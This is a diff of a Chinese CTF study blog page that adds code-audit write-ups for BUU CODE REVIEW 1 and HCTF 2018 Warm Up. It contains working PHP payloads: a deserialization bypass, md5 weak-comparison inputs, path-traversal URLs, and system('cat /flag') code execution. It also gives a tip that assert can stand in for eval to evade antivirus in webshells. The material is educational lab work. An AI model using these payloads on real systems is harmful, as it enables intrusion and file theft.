@@ -266,13 +266,13 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" target="_blank" rel="noopener" data-tags = "Web">Web</a>
+        <a class="post-tag" href="javascript:void(0);" target="_blank" rel="noopener" data-tags = "web">web</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">1.2k</span>Reading time: <span class="post-count reading-time">6 min</span></span>
+                        <span>Word count: <span class="post-count word-count">2.9k</span>Reading time: <span class="post-count reading-time">14 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -421,9 +421,56 @@ height:50vh;
 <p>原Payload2:<code>/?c=$pi=${(hexdec^decoct(31737))};$pi{pow}($pi{abs});</code><br>再post数据pow=system&amp;abs=cat /flag<br>更改为：<code>/?c=$pi={(hexdec^decoct(31737))};$$pi{pow}($$pi{abs});</code><br>再post数据pow=system&amp;abs=cat /flag</p>
 </blockquote>
 <p>因为原payload不是很顺利，结尾的分号可有可无因为是起连接作用但是已经没有接下来的部分了<br><img src="https://s1.ax1x.com/2020/04/01/GlNwkt.png" alt="GlNwkt.png"></p>
-<p>关于爆破出31737的脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$whitelist = [&apos;abs&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, &apos;atan2&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;base_convert&apos;, &apos;bindec&apos;, &apos;ceil&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;decbin&apos;, &apos;dechex&apos;, &apos;decoct&apos;, &apos;deg2rad&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;getrandmax&apos;, &apos;hexdec&apos;, &apos;hypot&apos;, &apos;is_finite&apos;, &apos;is_infinite&apos;, &apos;is_nan&apos;, &apos;lcg_value&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;log&apos;, &apos;max&apos;, &apos;min&apos;, &apos;mt_getrandmax&apos;, &apos;mt_rand&apos;, &apos;mt_srand&apos;, &apos;octdec&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;rad2deg&apos;, &apos;rand&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;srand&apos;, &apos;tan&apos;, &apos;tanh&apos;];</span><br><span class="line">foreach($whitelist as $white)&#123;</span><br><span class="line">    for($a=1;$a&lt;999999;$a++)&#123;</span><br><span class="line">        $result=$white^decoct($a);</span><br><span class="line">        if(strpos($result,&apos;_POST&apos;) === 0)&#123;</span><br><span class="line">            echo $white.&quot; &quot;.$a;</span><br><span class="line">            echo $result;</span><br><span class="line">            echo &quot;\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">#尝试过_GET，但是没有结果</span><br></pre></td></tr></table></figure></p>
-<p>LSB隐写：<a href="https://blog.csdn.net/attitudeisaltitude/article/details/81698719" target="_blank" rel="noopener">https://blog.csdn.net/attitudeisaltitude/article/details/81698719</a><br>zlib：<a href="https://blog.csdn.net/weixin_43877387/article/details/103102842" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43877387/article/details/103102842</a></p>
-
+<p>关于爆破出31737的脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$whitelist = [&apos;abs&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, &apos;atan2&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;base_convert&apos;, &apos;bindec&apos;, &apos;ceil&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;decbin&apos;, &apos;dechex&apos;, &apos;decoct&apos;, &apos;deg2rad&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;getrandmax&apos;, &apos;hexdec&apos;, &apos;hypot&apos;, &apos;is_finite&apos;, &apos;is_infinite&apos;, &apos;is_nan&apos;, &apos;lcg_value&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;log&apos;, &apos;max&apos;, &apos;min&apos;, &apos;mt_getrandmax&apos;, &apos;mt_rand&apos;, &apos;mt_srand&apos;, &apos;octdec&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;rad2deg&apos;, &apos;rand&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;srand&apos;, &apos;tan&apos;, &apos;tanh&apos;];</span><br><span class="line">foreach($whitelist as $white)&#123;</span><br><span class="line">    for($a=1;$a&lt;999999;$a++)&#123;</span><br><span class="line">        $result=$white^decoct($a);</span><br><span class="line">        if(strpos($result,&apos;_POST&apos;) === 0)&#123;</span><br><span class="line">            echo $white.&quot; &quot;.$a;</span><br><span class="line">            echo $result;</span><br><span class="line">            echo &quot;\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">#尝试过_GET，但是没有结果</span><br></pre></td></tr></table></figure><br>LSB隐写：<a href="https://blog.csdn.net/attitudeisaltitude/article/details/81698719" target="_blank" rel="noopener">https://blog.csdn.net/attitudeisaltitude/article/details/81698719</a><br>zlib：<a href="https://blog.csdn.net/weixin_43877387/article/details/103102842" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43877387/article/details/103102842</a></p>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;PHP代码里输出的 hello world.\n&quot;;</span><br><span class="line">$output = &quot;/etc/passwd 的内容&quot;.file_get_contents(&quot;/etc/passwd&quot;).&quot;\n&quot;;</span><br><span class="line">echo $output;</span><br><span class="line">$function_name = &quot;print_r&quot;;</span><br><span class="line">$arg = &quot;这是这里输出的。\n&quot;;</span><br><span class="line">$function_name($arg); //print_r($arg);</span><br><span class="line">?&gt;</span><br><span class="line">HTML 里输出的 hello world.</span><br></pre></td></tr></table></figure>
+<p>关于/etc/passwd：<a href="https://blog.csdn.net/zyy1659949090/article/details/88176215" target="_blank" rel="noopener">https://blog.csdn.net/zyy1659949090/article/details/88176215</a></p>
+<h3 id="BUU-CODE-REVIEW-1"><a href="#BUU-CODE-REVIEW-1" class="headerlink" title="BUU CODE REVIEW 1"></a>BUU CODE REVIEW 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: jinzhao</span><br><span class="line"> * Date: 2019/10/6</span><br><span class="line"> * Time: 8:04 PM</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__); #使代码不同功能高亮 ，__FILE__指向当前这个文件</span><br><span class="line"></span><br><span class="line">class BUU &#123;   #定义一个类BUU</span><br><span class="line">   public $correct = &quot;&quot;;  #有两个类成员，correct和input</span><br><span class="line">   public $input = &quot;&quot;;  #public表示类内外都能调用，为后面的反序列化做铺垫</span><br><span class="line"></span><br><span class="line">   public function __destruct() &#123;  #析构方法</span><br><span class="line">       try &#123;</span><br><span class="line">           $this-&gt;correct = base64_encode(uniqid());</span><br><span class="line">           if($this-&gt;correct === $this-&gt;input) &#123;  #如果两个成员全相等的话，才返回flag</span><br><span class="line">               echo file_get_contents(&quot;/flag&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; catch (Exception $e) &#123;   #异常捕获</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_GET[&apos;pleaseget&apos;] === &apos;1&apos;) &#123;</span><br><span class="line">    if($_POST[&apos;pleasepost&apos;] === &apos;2&apos;) &#123;</span><br><span class="line">        if(md5($_POST[&apos;md51&apos;]) == md5($_POST[&apos;md52&apos;]) &amp;&amp; $_POST[&apos;md51&apos;] != $_POST[&apos;md52&apos;]) &#123;</span><br><span class="line">            unserialize($_POST[&apos;obj&apos;]);#满足先前的条件就会对我们POST进来的obj参数进行反序列化，反序列化就是反序列化出BUU这个对象，最终拿到flag，obj就是类产生的对象</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>public 共有 ，类内外都能调用<br>protected 受保护的，类内和派生类能用<br>private 私有的，只有类内能用</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(md5($_POST[&apos;md51&apos;]) == md5($_POST[&apos;md52&apos;]) &amp;&amp; $_POST[&apos;md51&apos;] != $_POST[&apos;md52&apos;])</span><br></pre></td></tr></table></figure>
+<p>弱等于可以用数组绕过，也可以0e绕过，还可以md5碰撞，即：</p>
+<blockquote>
+<ol>
+<li>post md51[]=a&amp;md52[]=b </li>
+<li>post md51=QNKCDZO&amp;md52=s878926199a</li>
+<li><a href="https://www.jianshu.com/p/c9089fd5b1ba" target="_blank" rel="noopener">https://www.jianshu.com/p/c9089fd5b1ba</a> </li>
+</ol>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class BUU&#123;</span><br><span class="line">    public $correct=&quot;&quot;;</span><br><span class="line">    public $input=&quot;&quot;;</span><br><span class="line">    #因为析构方法无法调用，可以不加</span><br><span class="line">&#125;</span><br><span class="line">$obj=new BUU();#以BUU类为基础，产生了一个obj对象</span><br><span class="line">$obj-&gt;input=&amp;$obj-&gt;correct; #访问input相当于访问correct，把correct的指针给到input</span><br><span class="line">echo serialize($obj);</span><br><span class="line"># O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125;</span><br><span class="line">#这串字符串就是我们的对象的描述，用这个序列化字符串绕过析构函数中的全等于，得到flag</span><br></pre></td></tr></table></figure>
+<p>PHP引用(&amp;)使用:</p>
+<blockquote>
+<p>php的引用（就是在变量或者函数、对象等前面加上&amp;符号）<br>在PHP 中引用的意思是：不同的名字访问同一个变量内容。<br>与Ｃ语言中的指针是有差别，Ｃ语言中的指针里面存储的是变量的内容，在内存中存放的地址。</p>
+</blockquote>
+<p>第一次用postman：<br><img src="https://s1.ax1x.com/2020/04/01/G3oMqg.png" alt="G3oMqg.png"></p>
+<h3 id="HCTF-2018-Warm-Up"><a href="#HCTF-2018-Warm-Up" class="headerlink" title="HCTF 2018 Warm Up"></a>HCTF 2018 Warm Up</h3><p>访问source.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    highlight_file(__FILE__); </span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page) #定义类方法checkFile，参数为引用的page</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; #定义白名单数组</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123; #检查page是否为字符串</span><br><span class="line">                echo &quot;you can&apos;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123; #判断page是否在白名单内</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">            ); #截取page里？前的内容，赋值到_page </span><br><span class="line">            if (in_array($_page, $whitelist)) &#123; #判断_page是否在白名单内</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&apos;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&apos;file&apos;])  #$_REQUEST包括$_GET和$_POST</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])  </span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&apos;file&apos;];   #逻辑与要求三者为true才请求文件</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>=&gt; 是数组成员访问符号<br>-&gt; 是对象成员访问符号<br>&amp;&amp; 逻辑与运算符<br>|| 逻辑或运算符</p>
+</blockquote>
+<p>访问hint.php</p>
+<blockquote>
+<p>flag not here, and flag in ffffllllaaaagggg</p>
+</blockquote>
+<p>利用路径穿越所以payload：<br><code>http://22b21dad-ad47-4fc4-becd-ca6f63f427ab.node3.buuoj.cn/source.php?file=hint.php?../../../../../ffffllllaaaagggg</code><br>同样地<br><code>http://22b21dad-ad47-4fc4-becd-ca6f63f427ab.node3.buuoj.cn/source.php?file=hint.php?/../../../../ffffllllaaaagggg</code><br>少了个/少返回上一级目录</p>
+<p>网上的wp到底在讲些什么蛇皮，为什么要编码绕过？？？<br><strong>以下内容仅供参考，我以后可能回来推翻自己</strong></p>
+<p>由于是<code>include $_REQUEST[&#39;file&#39;];</code>，所以我们传入的参数值是file的内容，也就是<code>hint.php?../../../../../ffffllllaaaagggg</code></p>
+<p>函数<code>checkFile(&amp;$page)</code> 变量名称为page所以file就是传入page变量中</p>
+<p>看到中间<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; #定义白名单数组</span><br><span class="line">if (! isset($page) || !is_string($page)) &#123; #检查page是否为字符串</span><br><span class="line">    echo &quot;you can&apos;t see it&quot;;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (in_array($page, $whitelist)) &#123; #判断page是否在白名单内</span><br><span class="line">    return true;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_page = mb_substr(</span><br><span class="line">    $page,</span><br><span class="line">    0,</span><br><span class="line">    mb_strpos($page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">); #截取page里？前的内容，赋值到_page </span><br><span class="line">if (in_array($_page, $whitelist)) &#123; #判断_page是否在白名单内</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_page = urldecode($page);</span><br><span class="line">$_page = mb_substr(</span><br><span class="line">    $_page,</span><br><span class="line">    0,</span><br><span class="line">    mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">);</span><br><span class="line">if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;you can&apos;t see it&quot;;</span><br><span class="line">return false;</span><br></pre></td></tr></table></figure><br>对于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (in_array($page, $whitelist)) &#123; #判断page是否在白名单内</span><br><span class="line">    return true;</span><br></pre></td></tr></table></figure><br>$page的值如果不只是hint.php或者source.php，而是加上后面的payload，为什么这里in_array还能输出true呢？</p>
+<blockquote>
+<p>就是因为php弱类型比较，参考<a href="https://www.jianshu.com/p/e44048c473fb，如果想要严格比较需要加个true" target="_blank" rel="noopener">https://www.jianshu.com/p/e44048c473fb，如果想要严格比较需要加个true</a></p>
+</blockquote>
+<p>参考弱类型中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump( 1==&quot;1admin&quot;);</span><br><span class="line">#bool(true)</span><br></pre></td></tr></table></figure><br>待定:我理解为字符串开头相同，两者就相同。(应该只有开头是数字才满足)</p>
+<p>对于接下来的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">    $page,</span><br><span class="line">    0,</span><br><span class="line">    mb_strpos($page . &apos;?&apos;, &apos;?&apos;)</span><br></pre></td></tr></table></figure><br><code>mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</code>先让<code>$page</code>结尾接上一个<code>?</code>，再找首次出现？的位置，然后<code>mb_substr</code>函数截取这一段内容，也就是<code>hint.php</code>或<code>source.php</code></p>
+<p>那妥妥的怎么可能不是true呢，肯定在白名单内</p>
+<p>接下来urldecode，如果你用<code>file=hint.php?../../../../../ffffllllaaaagggg</code>，传到服务器上还是这段payload，然后urldecode之后，也还是这段，自然可以满足条件输出flag，就算你没有像<a href="https://blog.csdn.net/wang_624/article/details/101433257" target="_blank" rel="noopener">https://blog.csdn.net/wang_624/article/details/101433257</a> 一样用<code>%253f</code>绕过，也没有问题，url传入到服务器解码了一次，然后变成<code>%3f</code>，因为是弱类型比较，所以<code>in_array</code>都判断为true，urldecode解码后也判断为true。</p>
+<p><strong>我觉得和？在url中的作用有关，现在还没有弄清楚</strong></p>
+<h3 id="常见危险函数和特殊函数"><a href="#常见危险函数和特殊函数" class="headerlink" title="常见危险函数和特殊函数"></a>常见危险函数和特殊函数</h3><p>2016年的视频：<a href="https://www.bilibili.com/video/BV1vt411P7Pm?p=4" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1vt411P7Pm?p=4</a></p>
+<h4 id="PHP代码执行函数"><a href="#PHP代码执行函数" class="headerlink" title="PHP代码执行函数"></a>PHP代码执行函数</h4><p>常见的webshell都是用eval，因为大部分杀软把eval列入黑名单了，所以可以用assert来代替eval执行具体操作。<br><img src="https://s1.ax1x.com/2020/04/01/G82jMQ.png" alt="G82jMQ.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cfunc=create_function(&apos;$v&apos;,&apos;return system($v);&apos;);</span><br><span class="line">#cfunc(&apos;whoami&apos;);</span><br><span class="line"></span><br><span class="line">call_user_func(&apos;system&apos;,&apos;whoami&apos;);</span><br></pre></td></tr></table></figure></p>
+<h4 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h4><p><img src="https://s1.ax1x.com/2020/04/01/G8RxSO.png" alt="G8RxSO.png"></p>
+<h4 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h4><p><img src="https://s1.ax1x.com/2020/04/01/G8W61O.png" alt="G8W61O.png"></p>
+<h4 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h4><p><img src="https://s1.ax1x.com/2020/04/01/G8fCgU.png" alt="G8fCgU.png"></p>
+<h4 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h4><p><img src="https://s1.ax1x.com/2020/04/01/G8fU8f.png" alt="G8fU8f.png"><br><img src="https://s1.ax1x.com/2020/04/01/G8f7I1.png" alt="G8f7I1.png"><br><img src="https://s1.ax1x.com/2020/04/01/G84i79.png" alt="G84i79.png"><br><img src="https://s1.ax1x.com/2020/04/01/G85qGq.png" alt="G85qGq.png"></p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2>
     </article>
     <!-- license  -->
     
@@ -431,7 +478,7 @@ height:50vh;
             <p>Author：<a href="https://dgz-cyber.github.io">DGZ</a>
             <p>原文链接：<a href="https://dgz-cyber.github.io/2020/04/01/%E8%B5%B5%E5%B8%88%E5%82%85b%E7%AB%99%E8%A7%86%E9%A2%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%BB%A5%E5%8F%8A%E4%B8%80%E7%82%B9misc%20(%E6%9C%AA%E5%AE%8C)/">https://dgz-cyber.github.io/2020/04/01/%E8%B5%B5%E5%B8%88%E5%82%85b%E7%AB%99%E8%A7%86%E9%A2%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%BB%A5%E5%8F%8A%E4%B8%80%E7%82%B9misc%20(%E6%9C%AA%E5%AE%8C)/</a>
             <p>发表日期：<a href="https://dgz-cyber.github.io/2020/04/01/%E8%B5%B5%E5%B8%88%E5%82%85b%E7%AB%99%E8%A7%86%E9%A2%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%BB%A5%E5%8F%8A%E4%B8%80%E7%82%B9misc%20(%E6%9C%AA%E5%AE%8C)/">April 1st 2020, 12:30:20 am</a>
-            <p>更新日期：<a href="https://dgz-cyber.github.io/2020/04/01/%E8%B5%B5%E5%B8%88%E5%82%85b%E7%AB%99%E8%A7%86%E9%A2%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%BB%A5%E5%8F%8A%E4%B8%80%E7%82%B9misc%20(%E6%9C%AA%E5%AE%8C)/">April 1st 2020, 12:32:00 am</a>
+            <p>更新日期：<a href="https://dgz-cyber.github.io/2020/04/01/%E8%B5%B5%E5%B8%88%E5%82%85b%E7%AB%99%E8%A7%86%E9%A2%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%BB%A5%E5%8F%8A%E4%B8%80%E7%82%B9misc%20(%E6%9C%AA%E5%AE%8C)/">April 1st 2020, 11:31:39 pm</a>
             <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -563,7 +610,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#弱类型"><span class="toc-number">1.</span> <span class="toc-text">弱类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#暴力破解"><span class="toc-number">2.</span> <span class="toc-text">暴力破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#命令执行"><span class="toc-number">3.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2019-初赛-Love-Math"><span class="toc-number">3.1.</span> <span class="toc-text">[CISCN 2019 初赛]Love Math</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#弱类型"><span class="toc-number">1.</span> <span class="toc-text">弱类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#暴力破解"><span class="toc-number">2.</span> <span class="toc-text">暴力破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#命令执行"><span class="toc-number">3.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2019-初赛-Love-Math"><span class="toc-number">3.1.</span> <span class="toc-text">[CISCN 2019 初赛]Love Math</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码审计"><span class="toc-number">4.</span> <span class="toc-text">代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BUU-CODE-REVIEW-1"><span class="toc-number">4.1.</span> <span class="toc-text">BUU CODE REVIEW 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-Warm-Up"><span class="toc-number">4.2.</span> <span class="toc-text">HCTF 2018 Warm Up</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常见危险函数和特殊函数"><span class="toc-number">4.3.</span> <span class="toc-text">常见危险函数和特殊函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP代码执行函数"><span class="toc-number">4.3.1.</span> <span class="toc-text">PHP代码执行函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#包含函数"><span class="toc-number">4.3.2.</span> <span class="toc-text">包含函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#命令执行函数"><span class="toc-number">4.3.3.</span> <span class="toc-text">命令执行函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#文件操作函数"><span class="toc-number">4.3.4.</span> <span class="toc-text">文件操作函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#特殊函数"><span class="toc-number">4.3.5.</span> <span class="toc-text">特殊函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件上传"><span class="toc-number">5.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件包含"><span class="toc-number">6.</span> <span class="toc-text">文件包含</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -576,6 +623,8 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
     
     
     
@@ -1220,17 +1269,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
